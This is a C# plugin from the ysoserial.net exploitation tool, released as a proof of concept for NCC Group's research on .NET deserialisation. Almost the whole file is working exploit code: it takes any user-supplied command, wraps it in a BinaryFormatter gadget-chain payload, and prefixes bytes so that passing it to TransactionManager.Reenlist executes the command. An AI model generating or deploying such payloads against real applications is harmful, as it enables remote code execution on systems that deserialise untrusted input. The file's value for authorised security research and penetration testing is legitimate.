using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using System.Transactions;
using ysoserial.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `TransactionManager.Reenlist(Guid, Byte[], IEnlistmentNotification) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.transactions.transactionmanager.reenlist  
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  This PoC produces an error and may crash the application
 **/

namespace ysoserial.Plugins
{
    public class TransactionManagerReenlistPlugin : IPlugin
    {
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
            };

        public string Name()
        {
            return "TransactionManagerReenlist";
        }

        public string Description()
        {
            return "Generates payload for the TransactionManager.Reenlist method";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.Test = test;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            object payload = "";
            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest( "BinaryFormatter", inputArgs);
            byte[] newSerializedData = new byte[serializedData.Length + 5]; // it has BinaryReader ReadInt32() + 1 additional byte read
            serializedData.CopyTo(newSerializedData, 5);
            newSerializedData[0] = 1;


            payload = newSerializedData;

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    TestMe myTransactionEnlistment = new TestMe();
                    TransactionManager.Reenlist(Guid.NewGuid(), newSerializedData, myTransactionEnlistment);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }
            

            return payload;
        }

        class TestMe : IEnlistmentNotification
        {
            public void Commit(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }

            public void InDoubt(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }

            public void Prepare(PreparingEnlistment preparingEnlistment)
            {
                throw new NotImplementedException();
            }

            public void Rollback(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }
        }
    }
}
